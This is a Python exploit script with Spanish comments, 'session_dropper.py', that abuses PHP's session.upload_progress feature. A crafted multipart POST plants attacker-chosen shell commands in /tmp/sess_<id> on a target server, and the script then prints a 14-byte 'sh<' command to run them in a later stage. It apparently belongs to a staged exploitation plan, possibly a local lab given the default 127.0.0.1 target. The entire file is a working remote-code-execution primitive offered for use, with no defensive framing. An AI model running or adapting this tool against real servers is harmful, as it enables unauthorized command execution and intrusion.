#!/usr/bin/env python3
"""
session_dropper.py — Primitiva de escritura remota de archivos vía session.upload_progress.

Objetivo:
    Superar la dependencia del bind-mount compartido (/out) para ejecución de comandos largos
    (Fase B del Action Plan: 'Canal de comandos arbitrario' / Brecha F de gap-analysis.md).
    
    Aprovecha `session.upload_progress.enabled = On`: con `cleanup = Off` el archivo persiste
    la ventana del upload. En ambos casos el contenido queda en:
        /tmp/sess_<session_id>
    
    Permite depositar un script arbitrario (ej. /tmp/sess_c) de forma 100% remota sin supuestos
    sobre la aplicación y ejecutarlo posteriormente con:
        sh</tmp/sess_c (14 bytes exactos, ajustado al límite de stage 3).

Uso:
    python3 session_dropper.py --url http://127.0.0.1:8088/index.php --sessid c --payload "id; uname -a; whoami"
"""

import argparse
import socket
import subprocess
import sys
import time
import urllib.parse


def build_dropper_request(host, port, path, sessid, payload_cmd):
    bnd = b"----WebKitFormBoundarySessionDrop"
    
    # El archivo de sesion serializado contiene el prefijo de upload progress:
    # upload_progress_<PAYLOAD>|a:5:{...}
    # Para que sea un script de shell limpio y valido al ejecutarse con `sh < /tmp/sess_<id>`,
    # anteponemos un salto de linea y el comando, seguido de un exit o comentario '#' para
    # neutralizar la serializacion binaria de PHP que sigue despues.
    shell_content = b"\n" + payload_cmd.encode() + b"\nexit 0\n"
    
    body = bytearray()
    
    # Campo 1: Activa la sesion con el ID elegido
    body += b"--" + bnd + b"\r\n"
    body += b'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n'
    body += sessid.encode() + b"\r\n"
    
    # Campo 2: Clave de upload progress con el contenido inyectado
    body += b"--" + bnd + b"\r\n"
    body += b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
    body += shell_content + b"\r\n"
    
    # Campo 3: Archivo dummy en upload para detonar el progreso
    body += b"--" + bnd + b"\r\n"
    body += b'Content-Disposition: form-data; name="file"; filename="dummy.txt"\r\n'
    body += b"Content-Type: text/plain\r\n\r\n"
    body += b"UPLOAD_DUMMY_DATA\r\n"
    body += b"--" + bnd + b"--\r\n"
    
    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Content-Type: multipart/form-data; boundary={bnd.decode()}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + bytes(body)
    
    return req


def drop_file(url, sessid, payload_cmd):
    parsed = urllib.parse.urlparse(url)
    host = parsed.hostname or "127.0.0.1"
    port = parsed.port or 80
    path = parsed.path or "/index.php"
    
    req = build_dropper_request(host, port, path, sessid, payload_cmd)
    
    s = socket.create_connection((host, port), timeout=10)
    s.sendall(req)
    
    resp = bytearray()
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            resp += chunk
    except OSError:
        pass
    finally:
        s.close()
        
    status_line = resp.split(b"\r\n", 1)[0].decode(errors="replace")
    return status_line


def main():
    parser = argparse.ArgumentParser(description="Primitiva remota para depositar scripts de ejecucion vía sesiones PHP.")
    parser.add_argument("--url", required=True, help="URL del target PHP")
    parser.add_argument("--sessid", default="c", help="ID de sesion para nombrar el archivo (/tmp/sess_<id>)")
    parser.add_argument("--payload", default="id; uname -a", help="Comandos shell a depositar")
    args = parser.parse_args()

    target_file = f"/tmp/sess_{args.sessid}"
    print(f"[*] Subiendo payload a {args.url} -> {target_file}")
    print(f"[*] Contenido: {args.payload}")

    status = drop_file(args.url, args.sessid, args.payload)
    print(f"[+] Respuesta del servidor: {status}")
    print(f"[+] Archivo remoto listo: {target_file}")
    print(f"[+] Comando para Stage 3 (<=14 bytes): sh<{target_file}")


if __name__ == "__main__":
    main()
